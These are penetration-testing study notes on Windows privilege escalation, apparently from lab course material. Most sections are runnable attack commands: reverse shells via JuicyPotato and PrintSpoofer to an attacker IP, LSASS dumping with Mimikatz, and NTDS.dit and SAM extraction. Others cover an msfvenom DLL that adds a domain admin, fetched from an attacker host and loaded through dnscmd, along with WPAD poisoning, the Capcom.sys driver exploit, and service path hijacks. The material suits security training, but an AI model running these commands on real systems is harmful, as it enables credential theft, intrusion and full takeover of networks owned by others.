# Useful Tools

| Tool                                                                                                     | Description                                                                                                                                                                                                                                                                                                               |
| -------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [Seatbelt](https://github.com/GhostPack/Seatbelt)                                                        | C# project for performing a wide variety of local privilege escalation checks                                                                                                                                                                                                                                             |
| [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) | WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained [here](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)                                                                                                          |
| [PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)      | PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found                                                                                                                                                         |
| [SharpUp](https://github.com/GhostPack/SharpUp)                                                          | C# version of PowerUp                                                                                                                                                                                                                                                                                                     |
| [JAWS](https://github.com/411Hall/JAWS)                                                                  | PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0                                                                                                                                                                                                                                  |
| [SessionGopher](https://github.com/Arvanaghi/SessionGopher)                                              | SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information                                                                                                                         |
| [Watson](https://github.com/rasta-mouse/Watson)                                                          | Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.                                                                                                                                                                                                    |
| [LaZagne](https://github.com/AlessandroZ/LaZagne)                                                        | Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more                                                                             |
| [Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)                        | WES-NG is a tool based on the output of Windows' `systeminfo` utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10, including their Windows Server counterparts, is supported                 |
| [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)         | We will use several tools from Sysinternals in our enumeration including [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk), [PipeList](https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist), and [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) |

We can also find pre-compiled binaries of `Seatbelt` and `SharpUp` [here](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries), and standalone binaries of `LaZagne` [here](https://github.com/AlessandroZ/LaZagne/releases/). It is recommended that we always compile our tools from the source if using them in a client environment.

# Privileged groups

|**Group**|**Description**|
|---|---|
|Default Administrators|Domain Admins and Enterprise Admins are "super" groups.|
|Server Operators|Members can modify services, access SMB shares, and backup files.|
|Backup Operators|Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs.|
|Print Operators|Members can log on to DCs locally and "trick" Windows into loading a malicious driver.|
|Hyper-V Administrators|If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins.|
|Account Operators|Members can modify non-protected accounts and groups in the domain.|
|Remote Desktop Users|Members are not given any useful permissions by default but are often granted additional rights such as `Allow Login Through Remote Desktop Services` and can move laterally using the RDP protocol.|
|Remote Management Users|Members can log on to DCs with PSRemoting (This group is sometimes added to the local remote management group on non-DCs).|
|Group Policy Creator Owners|Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU.|
|Schema Admins|Members can modify the Active Directory schema structure and backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL.|
|DNS Admins|Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to [create a WPAD record](https://web.archive.org/web/20231115070425/https://cube0x0.github.io/Pocing-Beyond-DA/).|

# User rights

| Setting [Constant](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) | Setting Name                                                                                                                                                                              | Standard Assignment                                     | Description                                                                                                                                                                                                                                                                                                                                                |
| ----------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| SeNetworkLogonRight                                                                             | [Access this computer from the network](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/access-this-computer-from-the-network)               | Administrators, Authenticated Users                     | Determines which users can connect to the device from the network. This is required by network protocols such as SMB, NetBIOS, CIFS, and COM+.                                                                                                                                                                                                             |
| SeRemoteInteractiveLogonRight                                                                   | [Allow log on through Remote Desktop Services](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/allow-log-on-through-remote-desktop-services) | Administrators, Remote Desktop Users                    | This policy setting determines which users or groups can access the login screen of a remote device through a Remote Desktop Services connection. A user can establish a Remote Desktop Services connection to a particular server but not be able to log on to the console of that same server.                                                           |
| SeBackupPrivilege                                                                               | [Back up files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories)                               | Administrators                                          | This user right determines which users can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system.                                                                                                                                                                                         |
| SeSecurityPrivilege                                                                             | [Manage auditing and security log](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/manage-auditing-and-security-log)                         | Administrators                                          | This policy setting determines which users can specify object access audit options for individual resources such as files, Active Directory objects, and registry keys. These objects specify their system access control lists (SACL). A user assigned this user right can also view and clear the Security log in Event Viewer.                          |
| SeTakeOwnershipPrivilege                                                                        | [Take ownership of files or other objects](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects)         | Administrators                                          | This policy setting determines which users can take ownership of any securable object in the device, including Active Directory objects, NTFS files and folders, printers, registry keys, services, processes, and threads.                                                                                                                                |
| SeDebugPrivilege                                                                                | [Debug programs](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs)                                                             | Administrators                                          | This policy setting determines which users can attach to or open any process, even a process they do not own. Developers who are debugging their applications do not need this user right. Developers who are debugging new system components need this user right. This user right provides access to sensitive and critical operating system components. |
| SeImpersonatePrivilege                                                                          | [Impersonate a client after authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication)       | Administrators, Local Service, Network Service, Service | This policy setting determines which programs are allowed to impersonate a user or another specified account and act on behalf of the user.                                                                                                                                                                                                                |
| SeLoadDriverPrivilege                                                                           | [Load and unload device drivers](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/load-and-unload-device-drivers)                             | Administrators                                          | This policy setting determines which users can dynamically load and unload device drivers. This user right is not required if a signed driver for the new hardware already exists in the driver.cab file on the device. Device drivers run as highly privileged code.                                                                                      |
| SeRestorePrivilege                                                                              | [Restore files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories)                               | Administrators                                          | This security setting determines which users can bypass file, directory, registry, and other persistent object permissions when they restore backed up files and directories. It determines which users can set valid security principals as the owner of an object.                                                                                       |

# SeImpersonate and SeAssignPrimaryToken

The command `whoami /priv` confirms that [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) is listed. This privilege can be used to impersonate a privileged account such as `NT AUTHORITY\SYSTEM`. [JuicyPotato](https://github.com/ohpe/juicy-potato) can be used to exploit the `SeImpersonate` or `SeAssignPrimaryToken` privileges via DCOM/NTLM reflection abuse.

## JuicyPotato

To escalate privileges using these rights, let's first download the `JuicyPotato.exe` binary and upload this and `nc.exe` to the target server. Next, stand up a Netcat listener on port 8443, and execute the command below where `-l` is the COM server listening port, `-p` is the program to launch (cmd.exe), `-a` is the argument passed to cmd.exe, and `-t` is the `createprocess` call. Below, we are telling the tool to try both the [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) and [CreateProcessAsUser](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera) functions, which need `SeImpersonate` or `SeAssignPrimaryToken` privileges respectively.

```shell
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

```shell
sudo nc -lnvp 8443
```

## PrintSpoofer and RoguePotato

JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

```cmd
PrintSpoofer.exe -c "ncat.exe 10.10.14.3 8443 -e cmd"
```

```shell
nc -lnvp 8443
```

# SeDebugPrivilege

By default, only administrators are granted this privilege as it can be used to capture sensitive information from system memory, or access/modify kernel and application structures. This right may be assigned to developers who need to debug new system components as part of their day-to-day job. This user right should be given out sparingly because any account that is assigned it will have access to critical operating system components.

We can use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) suite to leverage this privilege and dump process memory. A good candidate is the Local Security Authority Subsystem Service ([LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)) process, which stores user credentials after a user logs on to a system.

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

This is successful, and we can load this in `Mimikatz` using the `sekurlsa::minidump` command. After issuing the `sekurlsa::logonPasswords` commands, we gain the NTLM hash of the local administrator account logged on locally. We can use this to perform a pass-the-hash attack to move laterally if the same local administrator password is used on one or multiple additional systems (common in large organizations).

> [!NOTE]
> Note: It is always a good idea to type "log" before running any commands in "Mimikatz" this way all command output will put output to a ".txt" file. This is especially useful when dumping credentials from a server which may have many sets of credentials in memory.

```cmd
mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...
```

Suppose we are unable to load tools on the target for whatever reason but have RDP access. In that case, we can take a manual memory dump of the `LSASS` process via the Task Manager by browsing to the `Details` tab, choosing the `LSASS` process, and selecting `Create dump file`. After downloading this file back to our attack system, we can process it using Mimikatz the same way as the previous example.

## Remote Code Execution as SYSTEM

```embed
title: "GitHub - decoder-it/psgetsystem: getsystem via parent process using ps1 & embeded c#"
image: "https://opengraph.githubassets.com/3ab3c8a61a4fefb8f5a0ec50d80c762cc413a58d36225abef5ffe575c059f73a/decoder-it/psgetsystem"
description: "getsystem via parent process using ps1 & embeded c# - decoder-it/psgetsystem"
url: "https://github.com/decoder-it/psgetsystem"
```

```embed
title: "PrivFu/PrivilegedOperations/SeDebugPrivilegePoC at main · daem0nc0re/PrivFu"
image: "https://opengraph.githubassets.com/87935b3f26d713d31d02c15151d94dcc93d330f4026a0a591bb36966d09af47e/daem0nc0re/PrivFu"
description: "Kernel mode WinDbg extension and PoCs for token privilege investigation. - daem0nc0re/PrivFu"
url: "https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC"
```

# SeTakeOwnershipPrivilege

[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns [WRITE_OWNER](https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights) rights over an object, meaning the user can change the owner within the object's security descriptor. Administrators are assigned this privilege by default. While it is rare to encounter a standard user account with this privilege, we may encounter a service account that, for example, is tasked with running backup jobs and VSS snapshots assigned this privilege. It may also be assigned a few others such as `SeBackupPrivilege`, `SeRestorePrivilege`, and `SeSecurityPrivilege` to control this account's privileges at a more granular level and not granting the account full local admin rights.

These privileges on their own could likely be used to escalate privileges. Still, there may be times when we need to take ownership of specific files because other methods are blocked, or otherwise, do not work as expected. Abusing this privilege is a bit of an edge case. Still, it is worth understanding in-depth, especially since we may also find ourselves in a scenario in an Active Directory environment where we can assign this right to a specific user that we can control and leverage it to read a sensitive file on a file share.

Suppose we encounter a user with this privilege or assign it to them through an attack such as GPO abuse using [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse). In that case, we could use this privilege to potentially take control of a shared folder or sensitive files such as a document containing passwords or an SSH key.

#### Enabling SeTakeOwnershipPrivilege

Notice from the output that the privilege is not enabled. We can enable it using this [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) which is detailed in [this](https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/) blog post, as well as [this](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) one which builds on the initial concept.

```powershell
PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```

> [!NOTE]
> Note: Take great care when performing a potentially destructive action like changing file ownership, as it could cause an application to stop working or disrupt user(s) of the target object. Changing the ownership of an important file, such as a live web.config file, is not something we would do without consent from our client first. Furthermore, changing ownership of a file buried down several subdirectories (while changing each subdirectory permission on the way down) may be difficult to revert and should be avoided.

Let's check out our target file to gather a bit more information about it.

```powershell
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }
```

Checking File Ownership

```powershell
cmd /c dir /q 'C:\Department Shares\Private\IT'
```

Now we can use the [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) Windows binary to change ownership of the file.

```powershell
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

We may still not be able to read the file and need to modify the file ACL using `icacls` to be able to read it.

```powershell
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```

## Files of Interest

```plain
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

We may also come across `.kdbx` KeePass database files, OneNote notebooks, files such as `passwords.*`, `pass.*`, `creds.*`, scripts, other configuration files, virtual hard drive files, and more that we can target to extract sensitive information from to elevate our privileges and further our access.

# Windows Built-in Groups

Backup Operators 	Event Log Readers 	DnsAdmins
Hyper-V Administrators 	Print Operators 	Server Operators

## Backup Operators

Membership of this group grants its members the `SeBackup` and `SeRestore` privileges. The [SeBackupPrivilege](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges) allows us to traverse any folder and list the folder contents. This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL). However, we can't do this using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the [FILE_FLAG_BACKUP_SEMANTICS](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) flag.

We can use this [PoC](https://github.com/giuliano108/SeBackupPrivilege) to exploit the `SeBackupPrivilege`, and copy this file. First, let's import the libraries in a PowerShell session.

```powershell
PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Get-SeBackupPrivilege

SeBackupPrivilege is enabled
```

### Attacking a Domain Controller - Copying NTDS.dit

As the `NTDS.dit` file is locked by default, we can use the Windows [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) utility to create a shadow copy of the `C` drive and expose it as `E` drive. The NTDS.dit in this shadow copy won't be in use by the system.

```powershell
diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```

```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

### Backing up SAM and SYSTEM Registry Hives

The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's `secretsdump.py`

```cmd
C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV

The operation completed successfully.


C:\htb> reg save HKLM\SAM SAM.SAV

The operation completed successfully.
```

It's worth noting that if a folder or file has an explicit deny entry for our current user or a group they belong to, this will prevent us from accessing it, even if the `FILE_FLAG_BACKUP_SEMANTICS` flag is specified.

### Extracting Credentials from NTDS.dit

```powershell
PS C:\htb> Import-Module .\DSInternals.psd1
PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

### Extracting Hashes Using SecretsDump

We can also use `SecretsDump` offline to extract hashes from the `ntds.dit` file obtained earlier. These can then be used for pass-the-hash to access additional resources or cracked offline using `Hashcat` to gain further access.

```shell
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

### Copying Files with Robocopy

The built-in utility [robocopy](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) can be used to copy files in backup mode as well. Robocopy is a command-line directory replication tool. It can be used to create backup jobs and includes features such as multi-threaded copying, automatic retry, the ability to resume copying, and more.

```cmd
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

This eliminates the need for any external tools.

### NetExec module

```shell
nxc smb dc -u user -p pass -M backup_operator
```

# Event Log Readers

Administrators or members of the [Event Log Readers](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255(v=ws.11)?redirectedfrom=MSDN#event-log-readers) group have permission to access this log. It is conceivable that system administrators might want to add power users or developers into this group to perform certain tasks without having to grant them administrative access.

We can query Windows events from the command line using the [wevtutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil) utility and the [Get-WinEvent](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.1) PowerShell cmdlet.

```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

```cmd
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

```powershell

Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

The cmdlet can also be run as another user with the `-Credential` parameter.

Other logs include [PowerShell Operational](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.1) log, which may also contain sensitive information or credentials if script block or module logging is enabled. This log is accessible to unprivileged users.

# DnsAdmins

The DNS service runs as `NT AUTHORITY\SYSTEM`, so membership in this group could potentially be leveraged to escalate privileges on a Domain Controller or in a situation where a separate server is acting as the DNS server for the domain. It is possible to use the built-in [dnscmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) utility to specify the path of the plugin DLL. As detailed in this excellent [post](https://adsecurity.org/?p=4064), the following attack can be performed when DNS is run on a Domain Controller (which is very common)

- DNS management is performed over RPC
- [ServerLevelPluginDll](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the `dnscmd` tool from the command line
- When a member of the `DnsAdmins` group runs the `dnscmd` command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated
- When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
- An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.

## ServerLevelPluginDll

Generating Malicious DLL

```shell
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

Download the file to the target

```powershell
wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```

Loading DLL as Non-Privileged User

```cmd hl:5
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

DNS Server failed to reset registry property.
    Status = 5 (0x00000005)
Command failed: ERROR_ACCESS_DENIED
```

As expected, attempting to execute this command as a normal user isn't successful. Only members of the `DnsAdmins` group are permitted to do this.

Loading DLL as Member of DnsAdmins

```cmd hl:4
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

## Using Mimilib.dll

As detailed in this [post](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), we could also utilize [mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) from the creator of the `Mimikatz` tool to gain command execution by modifying the [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) file to execute a reverse shell one-liner or another command of our choosing.

## Creating a WPAD Record

Another way to abuse DnsAdmins group privileges is by creating a WPAD record. Membership in this group gives us the rights to [disable global query block security](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps), which by default blocks this attack.

After disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through our attack machine. We could use a tool such as [Responder](https://github.com/lgandx/Responder) or [Inveigh](https://github.com/Kevin-Robertson/Inveigh) to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack.

Disabling the Global Query Block List

```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

Adding a WPAD Record

```powershell
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

# Print Operators

[Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators) is another highly privileged group, which grants its members the `SeLoadDriverPrivilege`, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down. If we issue the command `whoami /priv`, and don't see the `SeLoadDriverPrivilege` from an unelevated context, we will need to bypass UAC.

The [UACMe](https://github.com/hfiref0x/UACME) repo features a comprehensive list of UAC bypasses, which can be used from the command line. Alternatively, from a GUI, we can open an administrative command shell and input the credentials of the account that is a member of the Print Operators group. If we examine the privileges again, `SeLoadDriverPrivilege` is visible but disabled.

```cmd hl:9
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================  ==========
SeMachineAccountPrivilege     Add workstations to domain           Disabled
SeLoadDriverPrivilege         Load and unload device drivers       Disabled
SeShutdownPrivilege           Shut down the system			       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
```

t's well known that the driver `Capcom.sys` contains functionality to allow any user to execute shellcode with SYSTEM privileges. We can use our privileges to load this vulnerable driver and escalate privileges. We can use [this](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) tool to load the driver. The PoC enables the privilege as well as loads the driver for us.
## Use ExploitCapcom Tool to Escalate Privileges

To exploit the Capcom.sys, we can use the [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) tool after compiling with it Visual Studio.

```powershell
PS C:\htb> .\ExploitCapcom.exe

[*] Capcom.sys exploit
[*] Capcom.sys handle was obained as 0000000000000070
[*] Shellcode was placed at 0000024822A50008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
```

This launches a shell with SYSTEM privileges.

## Alternate Exploitation - No GUI

If we do not have GUI access to the target, we will have to modify the `ExploitCapcom.cpp` code before compiling. Here we can edit line 292 and replace `"C:\\Windows\\system32\\cmd.exe"` with, say, a reverse shell binary created with `msfvenom`, for example: `c:\ProgramData\revshell.exe`.

## Automating the Steps

We can use a tool such as [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) to automate the process of enabling the privilege, creating the registry key, and executing `NTLoadDriver` to load the driver. To do this, we would run the following:

```cmd
C:\htb> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-454284637-3659702366-2958135535-1103\System\CurrentControlSet\Capcom
NTSTATUS: c000010e, WinError: 0
```

We would then run `ExploitCapcom.exe` to pop a SYSTEM shell or run our custom binary.

> [!NOTE]
> Note: Since Windows 10 Version 1803, the "SeLoadDriverPrivilege" is not exploitable, as it is no longer possible to include references to registry keys under "HKEY_CURRENT_USER".

# Server Operators

The [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.

Membership of this group confers the powerful `SeBackupPrivilege` and `SeRestorePrivilege` privileges and the ability to control local services.

Querying the AppReadiness Service

```cmd
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

```cmd
sc start AppReadiness
```

```cmd
net localgroup Administrators
```

# User Account Control

Confirming UAC is Enabled

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

Checking UAC Level

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

Checking Windows Version

```powershell
[environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

This returns the build version 14393, which using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page we cross-reference to Windows release `1607`.

The [UACME](https://github.com/hfiref0x/UACME) project maintains a list of UAC bypasses, including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it. 

# Weak Permissions

## Permissive File System ACLs

### Running SharpUp

We can use [SharpUp](https://github.com/GhostPack/SharpUp/) from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.

```powershell
PS C:\htb> .\SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===


=== Modifiable Service Binaries ===

  Name             : SecurityService
  DisplayName      : PC Security Management Service
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
  
  <SNIP>
  
```

### Checking Permissions with icacls

Using [icacls](https://ss64.com/nt/icacls.html) we can verify the vulnerability and see that the `EVERYONE` and `BUILTIN\Users` groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents.

```powershell
PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

### Replacing Service Binary

```cmd
C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\htb> sc start SecurityService
```

### Checking Permissions with AccessChk

[AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite to enumerate permissions on the service. The flags we use, in order, are `-q` (omit banner), `-u` (suppress errors), `-v` (verbose), `-c` (specify name of a Windows service), and `-w` (show only objects that have write access).

```cmd
accesschk.exe /accepteula -quvcw WindscribeService
```

### Changing the Service Binary Path

```cmd
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```

```cmd
sc stop WindscribeService
